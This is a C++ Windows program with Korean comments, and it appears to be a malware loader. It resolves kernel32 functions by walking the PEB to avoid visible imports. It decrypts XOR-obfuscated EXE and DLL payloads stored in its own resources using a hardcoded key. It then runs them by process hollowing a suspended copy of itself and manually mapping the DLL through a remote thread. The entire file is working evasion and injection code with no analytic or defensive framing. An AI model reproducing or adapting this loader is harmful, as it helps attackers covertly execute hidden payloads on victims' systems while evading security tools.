#include <windows.h>
#include <winternl.h> // PEB 구조체 접근을 위해 필요
#include <iostream>
#include <vector>

#ifndef IMAGE_SIZEOF_BASE_RELOCATION
#define IMAGE_SIZEOF_BASE_RELOCATION       (sizeof(IMAGE_BASE_RELOCATION))
#endif

// 리소스 ID 정의
#define EXE_PAYLOAD 101
#define DLL_PAYLOAD 102

// --- API 함수 포인터 타입 정의 ---
typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);
typedef FARPROC(WINAPI* GetProcAddress_t)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* GetModuleHandleA_t)(LPCSTR);
typedef DWORD(WINAPI* GetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
typedef BOOL(WINAPI* CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI* GetThreadContext_t)(HANDLE, LPCONTEXT);
typedef LPVOID(WINAPI* VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* SetThreadContext_t)(HANDLE, const CONTEXT*);
typedef DWORD(WINAPI* ResumeThread_t)(HANDLE);
typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
typedef HANDLE(WINAPI* CreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HRSRC(WINAPI* FindResourceA_t)(HMODULE, LPCSTR, LPCSTR);
typedef HGLOBAL(WINAPI* LoadResource_t)(HMODULE, HRSRC);
typedef LPVOID(WINAPI* LockResource_t)(HGLOBAL);
typedef DWORD(WINAPI* SizeofResource_t)(HMODULE, HRSRC);

typedef BOOL(WINAPI* DllMain_t)(HMODULE, DWORD, LPVOID);

struct ManualMappingData {
    LoadLibraryA_t pLoadLibraryA;
    GetProcAddress_t pGetProcAddress;
    LPVOID imageBase;
};

// --- 동적으로 가져올 API 함수 포인터 ---
struct {
    GetModuleHandleA_t GetModuleHandleA;
    GetProcAddress_t GetProcAddress;
    LoadLibraryA_t LoadLibraryA;
    GetModuleFileNameA_t GetModuleFileNameA;
    CreateProcessA_t CreateProcessA;
    GetThreadContext_t GetThreadContext;
    VirtualAllocEx_t VirtualAllocEx;
    WriteProcessMemory_t WriteProcessMemory;
    SetThreadContext_t SetThreadContext;
    ResumeThread_t ResumeThread;
    CloseHandle_t CloseHandle;
    CreateRemoteThread_t CreateRemoteThread;
    FindResourceA_t FindResourceA;
    LoadResource_t LoadResource;
    LockResource_t LockResource;
    SizeofResource_t SizeofResource;
} API;

const char key[] = "mysecretkey";

// --- PEB/EAT 파싱 헬퍼 함수 ---
int wcsicmp_custom(const wchar_t* s1, const wchar_t* s2) {
    while (towlower(*s1) == towlower(*s2)) {
        if (*s1 == 0) return 0;
        s1++;
        s2++;
    }
    return towlower(*s1) - towlower(*s2);
}

FARPROC GetProcAddressManual(HMODULE hModule, const char* funcName) {
    if (!hModule || !funcName) return NULL;
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* pNameArray = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
    DWORD* pFuncArray = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);
    WORD* pOrdArray = (WORD*)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);
    for (DWORD i = 0; i < pExportDir->NumberOfNames; ++i) {
        char* pCurrentFuncName = (char*)((BYTE*)hModule + pNameArray[i]);
        if (strcmp(pCurrentFuncName, funcName) == 0) {
            WORD ordinal = pOrdArray[i];
            DWORD funcRVA = pFuncArray[ordinal];
            return (FARPROC)((BYTE*)hModule + funcRVA);
        }
    }
    return NULL;
}

// 복호화 함수
void xor_decrypt(unsigned char* data, size_t size) {
    for (size_t i = 0; i < size; ++i) {
        data[i] ^= key[i % (sizeof(key) - 1)];
    }
}

// 리소스 로딩 함수
std::vector<unsigned char> LoadPayloadFromResource(HMODULE hCurrent, int resourceId) {
    HRSRC hRes = API.FindResourceA(hCurrent, MAKEINTRESOURCEA(resourceId), RT_RCDATA);
    if (!hRes) return {};
    DWORD dwSize = API.SizeofResource(hCurrent, hRes);
    if (dwSize == 0) return {};
    HGLOBAL hResLoad = API.LoadResource(hCurrent, hRes);
    if (!hResLoad) return {};
    LPVOID pResLock = API.LockResource(hResLoad);
    if (!pResLock) return {};
    std::vector<unsigned char> payload(dwSize);
    memcpy(payload.data(), pResLock, dwSize);
    return payload;
}

// DLL 수동 매핑 함수
DWORD WINAPI ManualMapLibrary(LPVOID lpParameter) {
    ManualMappingData* data = (ManualMappingData*)lpParameter;
    if (!data || !data->imageBase) return 0;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)data->imageBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)data->imageBase + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptHeader = &pNtHeaders->OptionalHeader;

    if (pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)data->imageBase + pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (pImportDesc->Name) {
            char* moduleName = (char*)((LPBYTE)data->imageBase + pImportDesc->Name);
            HMODULE hModule = data->pLoadLibraryA(moduleName);
            if (!hModule) return 0;
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((LPBYTE)data->imageBase + pImportDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)((LPBYTE)data->imageBase + pImportDesc->FirstThunk);
            while (pThunk->u1.AddressOfData) {
                if (IMAGE_SNAP_BY_ORDINAL(pThunk->u1.Ordinal)) {
                    pIAT->u1.Function = (ULONGLONG)data->pGetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(pThunk->u1.Ordinal));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)data->imageBase + pThunk->u1.AddressOfData);
                    pIAT->u1.Function = (ULONGLONG)data->pGetProcAddress(hModule, pImportByName->Name);
                }
                pThunk++;
                pIAT++;
            }
            pImportDesc++;
        }
    }
    if (pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        ULONGLONG delta = (ULONGLONG)((LPBYTE)data->imageBase - pOptHeader->ImageBase);
        if (delta) {
            PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)data->imageBase + pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
            while (pBaseReloc->VirtualAddress) {
                LPBYTE dest = (LPBYTE)data->imageBase + pBaseReloc->VirtualAddress;
                USHORT* relocInfo = (USHORT*)((LPBYTE)pBaseReloc + IMAGE_SIZEOF_BASE_RELOCATION);
                for (DWORD i = 0; i < (pBaseReloc->SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / sizeof(USHORT); ++i) {
                    int type = relocInfo[i] >> 12;
                    int offset = relocInfo[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        *(ULONGLONG*)(dest + offset) += delta;
                    }
                }
                pBaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)pBaseReloc + pBaseReloc->SizeOfBlock);
            }
        }
    }
    if (pOptHeader->AddressOfEntryPoint) {
        DllMain_t DllMain = (DllMain_t)((LPBYTE)data->imageBase + pOptHeader->AddressOfEntryPoint);
        DllMain((HMODULE)data->imageBase, DLL_PROCESS_ATTACH, NULL);
    }
    return 1;
}

// --- 프로그램의 실제 시작점 ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // 1. PEB 파싱으로 API 주소 동적 로딩
    HMODULE hKernel32 = NULL;
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    LIST_ENTRY* head = &pPeb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* current = head->Flink;

    while (current != head) {
        LDR_DATA_TABLE_ENTRY* pLdrEntry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (pLdrEntry->FullDllName.Buffer) {
            const wchar_t* dllName = L"kernel32.dll";
            size_t nameLen = wcslen(dllName);
            size_t fullPathLen = wcslen(pLdrEntry->FullDllName.Buffer);
            if (fullPathLen >= nameLen) {
                if (wcsicmp_custom(pLdrEntry->FullDllName.Buffer + fullPathLen - nameLen, dllName) == 0) {
                    hKernel32 = (HMODULE)pLdrEntry->DllBase;
                    break;
                }
            }
        }
        current = current->Flink;
    }

    if (!hKernel32) return 1;

    API.GetProcAddress = (GetProcAddress_t)GetProcAddressManual(hKernel32, "GetProcAddress");
    if (!API.GetProcAddress) return 1;

    API.LoadLibraryA = (LoadLibraryA_t)API.GetProcAddress(hKernel32, "LoadLibraryA");
    API.GetModuleHandleA = (GetModuleHandleA_t)API.GetProcAddress(hKernel32, "GetModuleHandleA");
    API.GetModuleFileNameA = (GetModuleFileNameA_t)API.GetProcAddress(hKernel32, "GetModuleFileNameA");
    API.CreateProcessA = (CreateProcessA_t)API.GetProcAddress(hKernel32, "CreateProcessA");
    API.GetThreadContext = (GetThreadContext_t)API.GetProcAddress(hKernel32, "GetThreadContext");
    API.VirtualAllocEx = (VirtualAllocEx_t)API.GetProcAddress(hKernel32, "VirtualAllocEx");
    API.WriteProcessMemory = (WriteProcessMemory_t)API.GetProcAddress(hKernel32, "WriteProcessMemory");
    API.SetThreadContext = (SetThreadContext_t)API.GetProcAddress(hKernel32, "SetThreadContext");
    API.ResumeThread = (ResumeThread_t)API.GetProcAddress(hKernel32, "ResumeThread");
    API.CloseHandle = (CloseHandle_t)API.GetProcAddress(hKernel32, "CloseHandle");
    API.CreateRemoteThread = (CreateRemoteThread_t)API.GetProcAddress(hKernel32, "CreateRemoteThread");
    API.FindResourceA = (FindResourceA_t)API.GetProcAddress(hKernel32, "FindResourceA");
    API.LoadResource = (LoadResource_t)API.GetProcAddress(hKernel32, "LoadResource");
    API.LockResource = (LockResource_t)API.GetProcAddress(hKernel32, "LockResource");
    API.SizeofResource = (SizeofResource_t)API.GetProcAddress(hKernel32, "SizeofResource");

    // 2. 리소스에서 페이로드 로드 및 복호화
    HMODULE hSelf = API.GetModuleHandleA(NULL);
    std::vector<unsigned char> encrypted_exe = LoadPayloadFromResource(hSelf, EXE_PAYLOAD);
    std::vector<unsigned char> encrypted_dll = LoadPayloadFromResource(hSelf, DLL_PAYLOAD);

    if (encrypted_exe.empty() || encrypted_dll.empty()) return 1;

    xor_decrypt(encrypted_exe.data(), encrypted_exe.size());
    xor_decrypt(encrypted_dll.data(), encrypted_dll.size());

    // 3. 프로세스 할로잉 실행
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)encrypted_exe.data();
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)encrypted_exe.data() + pDosHeader->e_lfanew);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    char currentPath[MAX_PATH];
    API.GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    if (API.CreateProcessA(NULL, currentPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        CONTEXT context;
        context.ContextFlags = CONTEXT_FULL;
        API.GetThreadContext(pi.hThread, &context);

        LPVOID imageBase = API.VirtualAllocEx(pi.hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!imageBase) {
            imageBase = API.VirtualAllocEx(pi.hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }

        if (imageBase) {
            API.WriteProcessMemory(pi.hProcess, imageBase, encrypted_exe.data(), pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

            for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
                PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)encrypted_exe.data() + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
                API.WriteProcessMemory(pi.hProcess, (LPVOID)((LPBYTE)imageBase + pSectionHeader->VirtualAddress), (LPVOID)((LPBYTE)encrypted_exe.data() + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, NULL);
            }

#ifdef _WIN64
            context.Rcx = (ULONGLONG)((LPBYTE)imageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
            API.WriteProcessMemory(pi.hProcess, (LPVOID)(context.Rdx + 16), &imageBase, sizeof(LPVOID), NULL);
#else
            context.Eax = (DWORD)((LPBYTE)imageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
            API.WriteProcessMemory(pi.hProcess, (LPVOID)(context.Ebx + 8), &imageBase, sizeof(LPVOID), NULL);
#endif

            API.SetThreadContext(pi.hThread, &context);

            PIMAGE_DOS_HEADER pDllDosHeader = (PIMAGE_DOS_HEADER)encrypted_dll.data();
            PIMAGE_NT_HEADERS pDllNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)encrypted_dll.data() + pDllDosHeader->e_lfanew);

            LPVOID dllBase = API.VirtualAllocEx(pi.hProcess, NULL, pDllNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (dllBase) {
                API.WriteProcessMemory(pi.hProcess, dllBase, encrypted_dll.data(), pDllNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
                for (int i = 0; i < pDllNtHeaders->FileHeader.NumberOfSections; i++) {
                    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)encrypted_dll.data() + pDllDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
                    API.WriteProcessMemory(pi.hProcess, (LPVOID)((LPBYTE)dllBase + pSectionHeader->VirtualAddress), (LPVOID)((LPBYTE)encrypted_dll.data() + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, NULL);
                }

                ManualMappingData mappingData;
                mappingData.pLoadLibraryA = API.LoadLibraryA;
                mappingData.pGetProcAddress = API.GetProcAddress;
                mappingData.imageBase = dllBase;

                LPVOID pMappingData = API.VirtualAllocEx(pi.hProcess, NULL, sizeof(ManualMappingData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                API.WriteProcessMemory(pi.hProcess, pMappingData, &mappingData, sizeof(ManualMappingData), NULL);

                LPVOID pShellcode = API.VirtualAllocEx(pi.hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                API.WriteProcessMemory(pi.hProcess, pShellcode, ManualMapLibrary, 4096, NULL);

                HANDLE hThread = API.CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, pMappingData, 0, NULL);
                API.CloseHandle(hThread);
            }

            API.ResumeThread(pi.hThread);
        }

        API.CloseHandle(pi.hProcess);
        API.CloseHandle(pi.hThread);
    }

    return 0;
}